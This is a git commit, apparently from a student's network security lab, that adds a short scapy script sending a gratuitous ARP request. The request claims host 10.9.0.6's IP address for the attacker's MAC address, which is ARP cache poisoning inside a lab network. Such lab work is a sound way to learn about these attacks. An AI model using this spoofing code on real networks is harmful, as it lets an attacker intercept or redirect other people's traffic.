a0089ca45c30aa8e9a99af0e4f9eb72a18bec785
Areej Ali <areeja132000@gmail.com>
2024-04-12 19:58:02 -0400

    lab 3 completed

---
+++ lab-3/1c.py
@@ -0,0 +1,19 @@
+#!/usr/bin/env python3
+from scapy.all import *
+import time
+
+m_mac_address = '02:42:86:be:9d:85'
+m_ip_address = '10.9.0.1'
+b_mac_address = '02:42:0a:09:00:06'
+b_ip_address = '10.9.0.6'
+a_mac_address = '02:42:0a:09:00:05'
+a_ip_address = '10.9.0.5'
+
+E = Ether(src=m_mac_address, dst='ff:ff:ff:ff:ff:ff')
+A = ARP(psrc=b_ip_address, pdst=b_ip_address, hwsrc=m_mac_address, hwdst='ff:ff:ff:ff:ff:ff')
+A.op = 1 # 1 for ARP request; 2 for ARP reply
+
+pkt = E/A
+sendp(pkt, verbose=True, iface='br-49c8795efc97')
+
+
